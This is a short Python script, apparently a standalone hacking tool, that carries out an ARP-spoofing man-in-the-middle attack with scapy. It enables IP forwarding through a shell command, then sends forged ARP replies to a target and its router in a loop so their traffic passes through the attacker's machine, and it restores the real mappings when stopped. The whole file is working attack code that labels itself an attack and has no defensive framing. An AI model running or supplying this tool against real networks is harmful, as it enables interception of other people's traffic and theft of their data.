from scapy.all import ARP, send
from subprocess import call as execute_call
from time import sleep



class MITM:
    def __init__(self, target_ip, target_mac, router_ip, router_mac, interface):
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.router_ip = router_ip
        self.router_mac =router_mac
        self.interface = interface

    def port_forwarding(self, flag):
        flag_prompt = f"echo {str(flag)} > /proc/sys/net/ipv4/ip_forward"
        execute_call(flag_prompt, shell=True)

    def start_mitm(self):
        print("\nAttack has started...")
        print(self.target_ip + self.target_mac + self.router_ip + self.router_mac + self.interface)
        self.port_forwarding(1)
        while True:
            try:
                send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=self.target_mac), verbose=False)
                send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=self.router_mac), verbose=False)
                print("\rPackages are sending...", end="")
                sleep(1.5)
            except KeyboardInterrupt:
                self.end_mitm()
                print("\nAttack ended!")
                break
    
    def end_mitm(self):
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=self.router_mac, hwsrc=self.target_mac), count=7)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=self.target_mac, hwsrc= self.router_mac), count=7)
        self.port_forwarding(0)


if __name__ == "__main__":
    target_ip = "x.x.x.x" # ex. 192.168.1.25
    target_mac = "x:x:x:x:x:x" # ex. "qw:er:ty:as:df:gh"
    router_ip = "x.x.x.x" # ex. 192.168.1.25
    router_mac = "x:x:x:x:x:x" # ex. "qw:er:ty:as:df:gh"
    interface = "x" # ex. "wlan0"
    mitm = MITM(target_ip, target_mac, router_ip, router_mac, interface)
    mitm.start_mitm()